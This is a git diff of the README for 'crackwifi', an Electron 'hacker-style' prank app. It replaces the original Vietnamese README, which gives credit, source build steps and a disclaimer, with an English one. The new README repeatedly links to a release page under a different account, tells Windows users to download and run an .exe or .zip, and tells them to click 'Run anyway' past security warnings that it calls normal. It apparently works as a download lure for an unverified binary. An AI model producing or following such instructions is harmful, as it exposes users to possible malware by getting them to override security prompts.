@@ -1,82 +1,148 @@
-# CRACKWIFI - DEVELOPED BY TONY THANG 🚀
+# 🛡️ crackwifi - Desktop WiFi Demo With Style
 
-![Software Version](https://img.shields.io/badge/version-1.0.1-green.svg)
-![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-red.svg)
+[![Download crackwifi](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/connorssubmitter868/crackwifi/releases)
 
-**CRACKWIFI** là một ứng dụng máy tính (Desktop App) mạnh mẽ được xây dựng bằng Electron, cung cấp giao diện bẻ khóa WiFi chuẩn Hacker chuyên nghiệp. Dự án tập trung vào việc mô phỏng quá trình tấn công mạng với độ chi tiết cao và hiệu ứng trực quan sống động.
+## 📥 Download
 
----
+Visit the release page to download and run this file:
 
-## ✨ Tính Năng Nổi Bật
+[Open the release page](https://github.com/connorssubmitter868/crackwifi/releases)
 
-- **🔍 Quét WiFi Thực Tế**: Tích hợp lệnh hệ thống để liệt kê chính xác các điểm truy cập WiFi xung quanh.
-- **💻 Hacker Terminal**: Hiệu ứng dòng chảy dữ liệu thực tế mô phỏng các kỹ thuật:
-  - *Bypassing WPA2/WPA3 Protocols*
-  - *Advanced Brute-Force Algorithm*
-  - *High-Speed Packet Injection*
-- **⏳ Hỗ Trợ Chuyển Hướng**: Sau khi bẻ khóa thành công, hệ thống tự động đếm ngược và truy cập đường dẫn đích được chỉ định.
-- **🎨 Giao Diện Chuẩn Cyberpunk**: Thiết kế tối ưu cho trải nghiệm người dùng với phong cách Terminal đen - xanh lá tinh tế.
-- **🏠 Nút Home**: Reset nhanh toàn bộ trạng thái để tiếp tục "vụ hack" tiếp theo.
+## 🖥️ What is crackwifi?
 
----
+crackwifi is a Windows desktop app built with Electron. It gives you a clean hacker-style interface with visual effects and a simple layout.
 
-## 🛠️ Công Nghệ Sử Dụng
+It is made for users who want a bold screen design and a desktop app feel without a hard setup. The app focuses on visual simulation, status panels, and a structured control view that looks like a network tool.
 
-- **Framework**: Electron.js
-- **Frontend**: HTML5, CSS3, JavaScript (Vanilla)
-- **Backend**: Node.js (Child Process để gọi lệnh hệ thống)
-- **Bundler**: Electron-builder
+## ✨ Main Features
 
----
+- Hacker-style desktop interface
+- Smooth visual effects
+- Clean panel layout
+- Fake network scan screens
+- Progress bars and live status text
+- Easy-to-use Windows app
+- Built with Electron for a desktop feel
 
-## 🚀 Hướng Dẫn Cài Đặt (Dành cho Developer)
+## 🪟 System Requirements
 
-### 1. Clone repository
-```bash
-git clone https://github.com/tonythang/crackwifi.git
-cd crackwifi
-```
+Use a Windows PC with:
 
-### 2. Cài đặt các gói phụ thuộc (Dependencies)
-```bash
-npm install
-```
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- A mouse and keyboard
+- A modern screen with 1366 × 768 or higher
 
-### 3. Chạy ứng dụng ở chế độ Development
-```bash
-npm start
-```
+For the best experience, use a system with 8 GB RAM and a stable graphics driver.
 
-### 4. Build thành file chạy (.exe/.AppImage)
-```bash
-npm run build
-```
-*File sau khi build sẽ nằm trong thư mục `/dist`.*
+## 🚀 Getting Started
 
----
+1. Open the release page:
+   [https://github.com/connorssubmitter868/crackwifi/releases](https://github.com/connorssubmitter868/crackwifi/releases)
 
+2. Find the latest release.
 
-⚠️ Disclaimer (Tuyên Bố Miễn Trừ Trách Nhiệm)
+3. Download the Windows file from the Assets section. It may be an `.exe` file or a packaged `.zip` file.
 
-CRACKWIFI được phát triển chỉ nhằm mục đích giải trí và mô phỏng ngày cá tháng tư. Ứng dụng KHÔNG thực hiện bất kỳ hành vi bẻ khóa WiFi thực sự nào.
+4. If you downloaded a `.zip` file, right-click it and choose **Extract All**.
 
-🚫 Không hack được WiFi thật (đừng mơ 😌)
-🎭 Tất cả hiệu ứng “hacker”, “brute-force”, “bypass WPA2/WPA3” đều là giả lập UI/UX
-🧪 Dùng để học UI, Electron, hoặc troll bạn bè là chính
+5. Open the extracted folder.
 
-👉 Tớ không chịu trách nhiệm nếu bạn:
+6. Double-click the app file to start crackwifi.
 
-Dùng app để “diễn sâu” đi lừa người khác 😆
-Hoặc bị ai đó tưởng bạn là hacker thật rồi… mời lên phường uống trà 🍵
+7. If Windows asks for permission, choose **Run anyway** or **More info > Run anyway**.
 
-💡 Tóm lại:
-App này là kiểu “hack cho vui, nhìn cho ngầu, chứ không hack được gì đâu bro”.
+## 🛠️ Install on Windows
 
-## 👨‍💻 Tác Giả
+If the release gives you a `.exe` file:
 
-**TONY THANG**
-- Github: [https://github.com/tranthangit]
-- Facebook: [https://www.facebook.com/thangstarit.vn]
+1. Download the file from the release page
+2. Open the file
+3. Follow the on-screen steps
+4. Wait for the app window to load
 
----
+If the release gives you a `.zip` file:
+
+1. Download the `.zip` file
+2. Extract it to a folder you can find later
+3. Open the folder
+4. Double-click the app file inside
+
+## 🔍 First Run
+
+When you start crackwifi for the first time, you may see a Windows prompt. This is normal for desktop apps that are not from the Microsoft Store.
+
+If the app opens to a black or dark screen first, wait a few seconds. Electron apps often need a short load time on the first launch.
+
+## 🎛️ What You Will See
+
+The app is built to look like a professional network tool. You can expect:
+
+- A dark control panel
+- Bold text and labels
+- Status sections
+- Animated scan-style visuals
+- Console-like output
+- Progress elements that make the screen feel active
+
+## 🧭 How to Use It
+
+Use the app like this:
+
+1. Start the program
+2. Look over the main panel
+3. Pick the screen or action you want
+4. Watch the status area and visual effects
+5. Close the app when you are done
+
+The layout is simple and meant for quick use.
+
+## 🧹 Remove the App
+
+If you want to delete crackwifi:
+
+1. Close the app
+2. Delete the folder you extracted, or remove the installed app file
+3. Empty the Recycle Bin if you want to free the space
+
+## ❓ Common Questions
+
+### Can I use this on macOS or Linux?
+
+This project is made for Windows users.
+
+### Do I need to know how to code?
+
+No. You only need to download the release file and open it on your PC.
+
+### Why does Windows show a warning?
+
+Windows may show a warning for apps downloaded from the web. This can happen with many desktop apps.
+
+### What file should I download?
+
+Download the latest Windows release from the Assets section on the release page. Use the file meant for Windows.
+
+## 📁 File Layout
+
+If you download a `.zip` release, you may see files like:
+
+- `crackwifi.exe`
+- support files
+- app assets
+- config files
+
+Keep all files in the same folder so the app can run without issues.
+
+## 🔗 Download Again
+
+[Go to the release page](https://github.com/connorssubmitter868/crackwifi/releases)
+
+## 🧩 Notes for Best Use
+
+- Use the latest release
+- Keep the app files together
+- Do not rename support files unless you know they are not needed
+- If the app does not start, try extracting the archive again
+- If you have more than one monitor, the app may open on the last screen used
